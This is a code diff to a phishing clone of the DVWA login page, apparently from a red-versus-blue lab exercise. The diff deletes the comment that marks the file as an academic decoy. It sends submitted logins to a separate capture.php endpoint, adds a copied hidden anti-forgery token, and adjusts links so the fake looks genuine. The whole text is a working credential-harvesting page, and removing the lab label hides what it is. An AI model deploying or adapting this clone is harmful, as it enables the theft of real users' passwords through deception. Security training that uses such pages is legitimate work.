@@ -1,15 +1,14 @@
-<?php /* LAB PHISHING CLONE — uso académico aislado, solo credenciales señuelo. Escenario B Red vs Blue. */ ?>
 <!DOCTYPE html>
 
 <html lang="en-GB">
 
-	<head>
+	<head><base href="http://127.0.0.1:8080/">
 
 		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
 
 		<title>Login :: Damn Vulnerable Web Application (DVWA)</title>
 
-		<link rel="stylesheet" type="text/css" href="http://127.0.0.1:8080/dvwa/css/login.css" />
+		<link rel="stylesheet" type="text/css" href="dvwa/css/login.css" />
 
 	</head>
 
@@ -21,7 +20,7 @@
 
 	<br />
 
-	<p><img src="http://127.0.0.1:8080/dvwa/images/login_logo.png" /></p>
+	<p><img src="dvwa/images/login_logo.png" /></p>
 
 	<br />
 
@@ -29,7 +28,7 @@
 
 	<div id="content">
 
-	<form action="/capture.php" method="post">
+	<form action="http://127.0.0.1:8081/capture.php" method="post">
 
 	<fieldset>
 
@@ -44,7 +43,7 @@
 
 	</fieldset>
 
-	
+	<input type='hidden' name='user_token' value='19e95dad54788d2ae4a767d04a6075c7' />
 
 	</form>
 
@@ -65,7 +64,7 @@
 
 	<div id="footer">
 
-	<p><a href="#">Damn Vulnerable Web Application (DVWA)</a></p>
+	<p><a href="https://github.com/digininja/DVWA/" target="_blank">Damn Vulnerable Web Application (DVWA)</a></p>
 
 	</div> <!--<div id="footer"> -->
 
